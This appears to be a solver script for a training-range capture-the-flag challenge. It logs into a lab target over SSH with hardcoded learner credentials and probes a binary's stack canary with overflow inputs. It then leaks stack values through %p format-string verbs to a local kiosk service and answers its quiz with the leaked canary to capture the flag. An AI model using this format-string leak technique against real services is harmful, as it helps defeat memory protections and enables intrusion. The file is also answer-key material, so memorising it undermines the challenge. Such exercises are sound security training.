"""Intended-path solver: measure the canary boundary, leak it via format string,
then pass the vendor quiz."""

import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

BOUNDARY_CLEAN_CMD = "head -c 56 /dev/zero | tr '\\0' A | /opt/challenges/snack 2>&1; echo RC=$?"
BOUNDARY_SMASH_CMD = "head -c 96 /dev/zero | tr '\\0' A | /opt/challenges/snack 2>&1; echo RC=$?"

# Runs on the target box: walks the kiosk stack with positional %p verbs,
# then answers both quiz questions using what leaked. Each quiz attempt
# opens a fresh connection; the kiosk keeps one long-lived process, so its
# canary is identical across connections.
KIOSK_DRIVER = r"""
import re
import socket

HOST = ("127.0.0.1", 9994)

def conn():
    s = socket.create_connection(HOST, 5)
    return s, s.makefile("rwb")

def rd(f):
    return f.readline().decode(errors="replace").strip()

def wr(f, text):
    f.write((text + "\n").encode())
    f.flush()

s, f = conn()
print("banner:", rd(f))
verbs = ["%{}$p".format(i) for i in range(1, 41)]
leaks = []
for base in (0, 8, 16, 24, 32):
    wr(f, "order " + ",".join(verbs[base:base + 8]))
    leaks.append(rd(f))
    print("leak:", leaks[-1])
s.close()

candidates = []
seen = set()
for leaked in leaks:
    for token in re.findall(r"0x[0-9a-f]+", leaked):
        value = int(token, 16)
        if value > 0xFFFF and value & 0xFF == 0 and value not in seen:
            seen.add(value)
            candidates.append(value)
print("candidates:", [hex(c) for c in candidates])

prize = None
for cand in candidates:
    s, f = conn()
    rd(f)
    wr(f, "quiz")
    prompt = rd(f)
    if "question 1" not in prompt:
        s.close()
        continue
    wr(f, hex(cand))
    verdict = rd(f)
    print("try {} -> {}".format(hex(cand), verdict))
    if "wrong" in verdict:
        s.close()
        continue
    wr(f, "64")
    for _ in range(6):
        response = rd(f)
        print("resp:", response)
        if "prize:" in response:
            prize = response
        if prize or not response:
            break
    s.close()
    if prize:
        break
print("PRIZE:", prize if prize else "NONE")
"""


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def _run(client, cmd: str, timeout: int) -> str:
    _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode(errors="replace") + stderr.read().decode(errors="replace")


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    try:
        captured = None
        detail = None

        clean = _run(client, BOUNDARY_CLEAN_CMD, 30)
        smash = _run(client, BOUNDARY_SMASH_CMD, 30)
        if "devoured" not in clean or "RC=0" not in clean:
            detail = f"56-byte pattern did not pass cleanly: {clean[:200]}"
        elif "smashing detected" not in smash:
            detail = f"96-byte pattern did not smash the canary: {smash[:200]}"
        else:
            cmd = "python3 - <<'PYEOF'" + KIOSK_DRIVER + "\nPYEOF"
            transcript = _run(client, cmd, 90)
            flags = find_flags(transcript)
            captured = flags[0] if flags else None
            if not captured:
                detail = f"kiosk transcript held no flag: {transcript[-400:]}"
    finally:
        client.close()
    return SolveResult(
        results=[
            TaskResult(
                task_id="canary-quiz",
                ok=bool(captured),
                captured=captured,
                detail=detail,
            )
        ]
    )
